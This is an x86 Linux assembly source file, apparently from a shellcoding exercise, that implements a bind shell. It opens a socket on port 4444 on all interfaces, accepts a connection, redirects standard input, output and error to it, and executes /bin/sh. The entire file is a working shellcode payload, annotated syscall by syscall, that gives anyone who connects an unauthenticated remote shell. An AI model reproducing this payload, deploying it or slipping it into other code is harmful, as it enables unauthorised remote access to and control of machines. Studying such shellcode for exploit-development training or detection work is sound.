; bind_shell.nasm
;  - Bind to a socket, listen for a connection, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

	xor eax, eax
	push eax		; IPPROTO_IP
	inc eax
	push eax		; SOCK_STREAM
	mov ebx, eax		; socket, 1
	inc eax
	mov edi, eax
	push eax		; AF_INET
	mov ecx, esp		; args
	mov al, 0x66		; socketcall, 102
	int 0x80
	mov esi, eax


	; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct in_addr sin_addr, 0}
        ; eax = 0x66 (socketcall)
        ; ebx = 0x2 (bind)
        ; ecx = esp
        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|
        ;           sockfd      addr      addrlen  AF_INET  port  INADDR_ANY

	xor eax, eax
	push eax		; INADDR_ANY
	push word 0x5c11	; port, 4444
	push word di		; AF_INET
	mov ecx, esp
	mov al, 0x10
	push eax		; addrlen, 16
	push ecx		; addr
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov ebx, edi		; bind, 2
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x4 (listen)
        ; ecx = esp
        ; esp => |----------|0x00000000|
        ;           sockfd     backlog

	xor eax, eax
	push eax		; backlog
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov bl, 0x4		; listen, 4
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct$
        ; eax = 0x66 (socketcall)
        ; ebx = 0x5 (accept)
        ; ecx = esp
        ; esp => |----------|0x00000000|0x00000000|
        ;           sockfd       addr     addrlen

	xor eax, eax
	push eax		; addrlen
	push eax		; addrlen
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov bl, 0x5		; accept, 5
	mov ecx, esp		; args
	int 0x80		; execute
	mov ebx, eax		; save connfd


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 2, 1, 0

	xor ecx, ecx
	mov cl, 0x2		; stderr
duploop:
	xor eax, eax
	mov al, 0x3f		; dup2, 63
	int 0x80		; execute
	dec ecx
	jns duploop


        ; int execve(const char *filename, char *const argv[], char *const envp[])
        ; eax = 0xb
        ; ebx = [esp +8]
        ; ecx = esp
        ; edx = [esp +4]
        ; esp => |--[esp +8]--|0x00000000|0x2f62696e|0x2f2f7368|0x00000000|
        ;                                    /bin       //sh

	xor ecx, ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80
